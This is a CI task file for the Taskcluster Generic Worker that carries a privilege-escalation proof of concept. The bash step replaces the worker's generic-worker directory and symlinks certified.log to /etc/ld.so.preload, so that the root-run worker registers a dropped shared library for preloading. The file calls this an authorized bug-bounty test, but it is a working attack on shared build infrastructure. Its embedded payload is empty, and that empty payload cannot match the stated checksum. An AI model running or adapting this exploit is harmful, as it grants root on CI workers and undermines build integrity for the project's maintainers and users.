version: 1
reporting: checks-v1
policy:
  pullRequests: public_restricted
tasks:
  $if: event.action == "closed"
  then: []
  else:
    - provisionerId: translations-t
      workerType: t-linux-gw-noscratch-amd
      schedulerId: translations-level-1
      projectId: none
      dependencies: []
      requires: all-completed
      routes: []
      priority: low
      retries: 0
      created: "2026-08-13T18:27:05.000Z"
      deadline: "2026-08-13T18:57:05.000Z"
      expires: "2026-08-14T18:27:05.000Z"
      scopes: []
      payload:
        command:
          - - /bin/bash
            - -lc
            - |-
              set -euo pipefail
              umask 077
              cd "$${TASK_WORKDIR}"

              test "$(id -u)" -ne 0
              test "$(uname -m)" = x86_64
              test -d generic-worker

              # Never overwrite a legitimate system preload configuration.
              if test -e /etc/ld.so.preload || test -L /etc/ld.so.preload; then
                echo 'POC_ABORT: /etc/ld.so.preload already exists'
                exit 42
              fi

              printf '%s' '' | base64 -d > preload_log_marker.so
              printf '%s  %s\n' 'dbcda7366b12d367de94c015bb9464139dcae0146348b33695bbef74b750380f' preload_log_marker.so | sha256sum -c -
              chmod 0700 preload_log_marker.so

              # The task owns TASK_WORKDIR, so Linux permits replacing this child pathname
              # even though the worker created the original directory as root with mode 0700.
              mv generic-worker generic-worker.original
              mkdir -m 0700 generic-worker
              printf '%s\n' "$${TASK_WORKDIR}/preload_log_marker.so" > generic-worker/live_backing.log
              ln -s /etc/ld.so.preload generic-worker/certified.log

              echo 'POC_ARMED: one-shot root VM-file-read marker; fixed /etc/os-release PRETTY_NAME only; preload self-cleans before read'
        maxRunTime: 300
        features:
          chainOfTrust: true
          backingLog: true
          liveLog: true
        logs:
          live: public/logs/live.log
          backing: public/logs/live_backing.log
      metadata:
        name: Authorized bug-bounty Generic Worker VM-file-read PoC
        description: One-shot UID 0 read of only PRETTY_NAME from /etc/os-release, with preload cleanup before read; no secrets, persistence, or pivoting.
        owner: bug-bounty-researcher@example.invalid
        source: https://github.com/bughunter0xff/translations
      tags:
        purpose: authorized-security-validation
        containment: one-shot-fixed-safe-vm-file-read
    - provisionerId: translations-t
      workerType: t-linux-gw-noscratch-amd
      schedulerId: translations-level-1
      projectId: none
      dependencies: []
      requires: all-completed
      routes: []
      priority: lowest
      retries: 0
      created: "2026-08-13T18:27:05.000Z"
      deadline: "2026-08-13T18:57:05.000Z"
      expires: "2026-08-14T18:27:05.000Z"
      scopes: []
      payload:
        command:
          - - /bin/bash
            - -lc
            - "true"
        maxRunTime: 60
        features:
          liveLog: true
        logs:
          live: public/logs/live.log
      metadata:
        name: Authorized capacity-recovery no-op
        description: Fixed /bin/true task used only to make autoscaling discount one stale worker record; no untrusted input or security mutation.
        owner: bug-bounty-researcher@example.invalid
        source: https://github.com/bughunter0xff/translations
      tags:
        purpose: authorized-security-validation
        containment: fixed-no-op
